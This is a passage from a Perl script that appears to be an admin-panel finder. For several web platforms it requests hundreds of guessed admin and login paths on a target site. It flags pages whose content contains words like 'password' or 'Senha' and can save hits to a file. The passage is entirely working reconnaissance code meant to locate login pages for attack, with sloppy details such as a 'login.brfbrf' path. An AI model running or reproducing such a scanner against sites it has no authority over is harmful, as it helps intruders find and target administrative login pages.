        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{ 
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "4"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
        'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
        'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
        'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
        'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
        'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
        'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
        'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
        'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>hits.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }

        if($code eq "3"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
        'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
        'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
        'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
        'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
        'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
        'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
        'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>hits.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "5"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
        'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
        'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
        'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
        'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
        'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
        'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
        'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }

        if($code eq "6"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
        'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
        'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
        'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
        'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
        'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
        'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
        'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "7"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
        'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
        'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
        'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
        'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
        'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
        'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
        'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "8"){

        @path2=('login.htm','login.html','login/','adm/','admin/','admin/account.html','admin/login.html','admin/login.htm','admin/controlpanel.html','admin/controlpanel.htm','admin/adminLogin.html','admin/adminLogin.htm','admin.htm','admin.html','adminitem/','adminitems/','administrator/','administration/','adminLogin/','admin_area/','manager/','letmein/','superuser/','access/','sysadm/','superman/','supervisor/','control/','member/','members/','user/','cp/','uvpanel/','manage/','management/','signin/','log-in/','log_in/','sign_in/','sign-in/','users/','accounts/','wp-login.php','bb-admin/admin.html','relogin.htm','relogin.html','registration/','moderator/','controlpanel/','fileadmin/','admin1.html','admin1.htm','admin2.html','yonetim.html','yonetici.html','phpmyadmin/','myadmin/','ur-admin/','Server/','wp-admin/','administr8/','webadmin/','administratie/','admins/','administrivia/','Database_Administration/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','power_user/','system_administration/','ss_vms_admin_sm/','bb-admin/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','pages/admin/','admincp/','adminarea/','admincontrol/','modules/admin/','siteadmin/','adminsite/','kpanel/','vorod/','vorud/','adminpanel/','PSUser/','secure/','webmaster/','security/','usr/','root/','secret/','moderator.php','moderator.html','0admin/','0manager/','aadmin/','login_admin/','login_out/','loginerror/','loginok/','loginsave/','loginsuper/','logout/','secrets/','super1/','supervise/','admin1.php','admin1.html','admin2.php','admin2.html','yonetim.php','yonetim.html','yonetici.php','yonetici.html','adm/','admin/','admin/account.php','admin/account.html','admin/index.php','admin/index.html','admin/login.php','admin/login.html','admin/home.php','admin/controlpanel.html','admin/controlpanel.php','admin.php','admin.html','admin/cp.php','admin/cp.html','cp.php','cp.html','administrator/','administrator/index.html','administrator/index.php','administrator/login.html','administrator/login.php','administrator/account.html','administrator/account.php','administrator.php','administrator.html','login.php','login.html','modelsearch/login.php','moderator.php','moderator.html','moderator/login.php','moderator/login.html','moderator/admin.php','moderator/admin.html','moderator/','account.php','account.html','controlpanel/','controlpanel.php','controlpanel.html','admincontrol.php','admincontrol.html','adminpanel.php','adminpanel.html','admin1.asp','admin2.asp','yonetim.asp','yonetici.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/home.asp','admin/controlpanel.asp','admin.asp','admin/cp.asp','cp.asp','administrator/index.asp','administrator/login.asp','administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','moderator/admin.asp','account.asp','controlpanel.asp','
        admincontrol.asp','adminpanel.asp','fileadmin/','fileadmin.php','fileadmin.asp','fileadmin.html','administration/','administration.php','administration.html','sysadmin.php','sysadmin.html','phpmyadmin/','myadmin/','sysadmin.asp','sysadmin/','ur-admin.asp','ur-admin.php','ur-admin.html','ur-admin/','Server.php','Server.html','Server.asp','Server/','wp-admin/','administr8.php','administr8.html','administr8/','administr8.asp','webadmin/','webadmin.php','webadmin.asp','webadmin.html','administratie/','admins/','admins.php','admins.asp','admins.html','administrivia/','Database_Administration/','WebAdmin/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cPanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','members/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','admin_area/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','server/','database_administration/','power_user/','system_administration/','ss_vms_admin_sm/','adiministrador/','adm/','adimin/','login/','logout/','senha/','membros/','usuarios/','senhas/','sff/','saff/','donos/','noticias/','not/','painel/','administracao/','key/','edit/','config/','funcoes/','sistema/','php/','net/','controle','controles','membro','membros','acesso','senha','usuario','usuarios','admistrador','adimistrador','painel','root','roots','raiz','login.htm','login.html','login/','adm/','admin/','admin/account.html','admin/login.html','admin/login.htm','admin/controlpanel.html','admin/controlpanel.htm','admin/adminLogin.html','admin/adminLogin.htm','admin.htm','admin.html','adminitem/','adminitems/','administrator/','administration/','adminLogin/','admin_area/','manager/','letmein/','superuser/','access/','sysadm/','superman/','supervisor/','control/','member/','members/','user/','cp/','uvpanel/','manage/','management/','signin/','log-in/','log_in/','sign_in/','sign-in/','users/','accounts/','wp-login.php','bb-admin/admin.html','relogin.htm','relogin.html','registration/','moderator/','controlpanel/','fileadmin/','admin1.html','admin1.htm','admin2.html','yonetim.html','yonetici.html','phpmyadmin/','myadmin/','ur-admin/','Server/','wp-admin/','administr8/','webadmin/','administratie/','admins/','administrivia/','Database_Administration/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','power_user/','system_administration/','ss_vms_admin_sm/','bb-admin/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','pages/admin/','admincp/','adminarea/','admincontrol/','modules/admin/','siteadmin/','adminsite/','kpanel/','vorod/','vorud/','adminpanel/','PSUser/','secure/','webmaster/','security/','usr/','root/','secret/','moderator.php','moderator.html','0admin/','0manager/','aadmin/','login_admin/','login_out/','loginerror/','loginok/','loginsave/','loginsuper/','logout/','secrets/','super1/','supervise/','admin.php','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php','joomla/administrator','login.php','admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html','webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php','bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php','admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html','administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html','panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','adm/index.php','adm.php','affiliate.p